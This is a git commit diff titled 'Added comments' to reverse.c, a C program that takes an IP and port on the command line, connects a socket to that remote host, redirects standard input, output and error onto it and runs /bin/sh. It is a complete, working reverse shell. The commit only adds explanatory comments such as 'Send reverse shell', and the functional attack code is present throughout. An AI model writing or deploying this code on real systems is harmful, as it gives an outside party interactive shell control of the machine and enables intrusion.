a9e59b99d930a360a6b82f85ad81395ada9e584e
thanos <koutroubas.thanos@gmail.com>
2021-07-25 19:54:50 +0300

    Added comments

--- reverse.c
+++ reverse.c
@@ -8,7 +8,7 @@
 
 int main(int argc, char* argv[]){
 
-    /* Command Line Arguments Parsing */
+    /* Create CLI interface with arguments */
     if (argc < 2) {
         printf("usage: %s [-h] IP PORT\n", argv[0]);
         printf("%s: error: the following arguments are required: IP, PORT\n", argv[0]);
@@ -31,22 +31,25 @@ int main(int argc, char* argv[]){
         return 1; 
     }
 
+    /* Parse arguments */
     char* ip_addr = argv[1];
     int port = atoi(argv[2]);
 
+    /* Create a Network Socket */
     struct sockaddr_in revsockaddr;
-
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
     revsockaddr.sin_family = AF_INET;       
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr(ip_addr);
 
+    /* Connect to remote Machine */
     connect(sockt, (struct sockaddr *) &revsockaddr, 
     sizeof(revsockaddr));
     dup2(sockt, 0);
     dup2(sockt, 1);
     dup2(sockt, 2);
 
+    /* Send reverse shell */
     char * const argv_sh[] = {"/bin/sh", NULL};
     execve("/bin/sh", argv_sh, NULL);
 
